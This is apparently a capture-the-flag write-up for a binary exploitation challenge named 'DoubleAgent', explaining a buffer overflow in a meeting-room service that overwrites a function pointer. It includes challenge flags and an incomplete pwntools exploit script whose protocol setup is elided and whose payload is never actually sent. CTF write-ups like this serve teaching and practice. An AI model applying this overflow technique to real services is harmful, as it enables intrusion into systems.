# DoubleAgent

**Category:** PWN  
**Challenge Description:**

Two names, one file, and a meeting room with no windows. Something in here isn't what it seems.

Flag: `KOS{2487E76AE32D42BB84AF84710F04DDDE}`

## Analysis

The service is a meeting room manager backed by a custom heap allocator managing a `world` buffer (`0xe0` bytes). Two decoy flags are hardcoded in `.rodata` and printed by the shadow dossier option:

- `KOS{SHADOW_STATUS_REVIEWED}` — audit log
- `KOS{5F66BFFAF392C25A5702C2708DDD5032}` — dossier output

The real flag lives in `/flag`, read by `extract_flag()` at a known address (no PIE). By overflowing the `world` buffer we corrupt the function pointer at `g_conn+0x100`, then trigger it with `LEAVE`.

## Solution

1. Interact with the meeting room protocol to write a crafted payload into the `world` buffer.
2. Overflow past the buffer boundary to overwrite the handler pointer with `extract_flag`.
3. Send `LEAVE` to trigger the corrupted pointer.

```python
from pwn import *

r = remote('ctf.kosovacyber.team', 2010)

extract_flag = 0x401234

# Overflow world buffer (0xe0 bytes) to reach handler at g_conn+0x100
payload = b'A' * 0xe0 + p64(extract_flag)

# Send through the protocol's RECRUIT/FILL action
# ... protocol setup ...
r.sendline(b'LEAVE')
print(r.recvall(timeout=5).decode())
```
